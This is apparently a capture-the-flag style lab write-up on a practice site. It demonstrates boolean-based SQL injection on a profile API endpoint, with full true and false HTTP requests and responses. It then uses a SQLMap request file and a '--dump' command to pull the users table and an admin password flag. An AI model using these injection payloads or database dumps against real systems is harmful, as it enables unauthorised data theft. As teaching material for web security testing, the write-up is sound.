---
title: "Ottergram Union Based SQL Injection"
date: 2025-11-27
author: Shawn Szczepkowski
---

While exploring the application and testing different endpoints for SQL Injection we observe that the `/api/profile/{user}` endpoint appears to be vulnerable to boolean based SQL injection:

When sending a payload that evaluates to true. We observe that a 200 response is returned along with the profile information of user 1:

#### True Request:
```http
GET /api/profile/'%20or%20'7'%3d'7 HTTP/2
Host: aaf9b73b68ef.labs.bugforge.io
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY0Mjc0ODAzfQ.UhPVJ7myhk8Kf00n3QtNcJe3SZO8QBOx09k5xVNvMPo
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://aaf9b73b68ef.labs.bugforge.io/profile/test
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

#### True Response:
```http
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Thu, 27 Nov 2025 20:27:25 GMT
Etag: W/"1d4-l9dVbOu4aHO8YqQHTDCtiaCKJMQ"
X-Powered-By: Express
Content-Length: 468

{"user":{"id":1,"username":"otter_lover","email":"otter@example.com","full_name":"Otter Enthusiast","bio":"I love otters! 🦦","profile_picture":"/uploads/otter1.png","role":"user"},"posts":[{"id":1,"user_id":1,"image_url":"/uploads/otter1.png","caption":"Look at this adorable otter! 🦦❤️","created_at":"2025-11-27 20:18:53"},{"id":4,"user_id":1,"image_url":"/uploads/otter4.png","caption":"Another cute otter moment 📸","created_at":"2025-11-27 20:18:53"}]}
```

If we send a payload that evaluates to false like:
#### False Request
```http
GET /api/profile/'%20or%20'7'%3d'8 HTTP/2
Host: aaf9b73b68ef.labs.bugforge.io
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY0Mjc0ODAzfQ.UhPVJ7myhk8Kf00n3QtNcJe3SZO8QBOx09k5xVNvMPo
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://aaf9b73b68ef.labs.bugforge.io/profile/test
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

We observe no user information is returned:

#### False Response
```http
HTTP/2 404 Not Found
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Thu, 27 Nov 2025 20:29:13 GMT
Etag: W/"1a-hq/hT0ORGTkTfyRpVCZ/JB/r8Eg"
X-Powered-By: Express
Content-Length: 26

{"error":"User not found"}
```

We could start to test for Union based injection now, but for todays blog I'm going to demonstrate SQLMap. Let's copy a request to the profile endpoint and see if we can get SQLMap to do our dirty work for us. Since we are not testing an obvious parameter we will add a `*` where we want SQLMap to test. We will save the file as `sql.req`:

#### Request formatted for SQLMap
```http
GET /api/profile/test* HTTP/2
Host: aaf9b73b68ef.labs.bugforge.io
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY0Mjc0ODAzfQ.UhPVJ7myhk8Kf00n3QtNcJe3SZO8QBOx09k5xVNvMPo
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://aaf9b73b68ef.labs.bugforge.io/profile/test
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

Since we know this is a small lab, I will just have SQLMap dump everything with the `--dump` flag. In a real engagement that would be unwise and we could end up with way more data then we need. In that case I would recommend enumerating the DB name and tables, and then picking which information we would like to extract. I will also use the `--batch` command so the SQLMap picks the defaults to any prompts like the following:
```sh
[15:34:57] [INFO] parsing HTTP request from 'sql.req'
custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
```

#### SQLMap command using a request file
```sh
┌──(kali㉿kali)-[~/bugforge]
└─$ sqlmap -r sql.req --force-ssl --batch --level 2 --risk 2 --dump
```
-  Note the `--force-ssl` flag. Without it, SQLMap may follow an HTTP→HTTPS redirect, and that redirect behavior often causes SQLMap to throw errors or fail to properly detect injection points. Forcing SSL keeps the testing consistent and avoids those redirect-related issues.
- We could start with the default SQLMap level and risk of `1` but I find `2` is a nice middle ground.


After a short period of time, we see that SQLMap has found the `users` table, and the `admin` users password is our flag:
![Content of users table](/assets/images/Pasted%20image%2020251127154629.png)
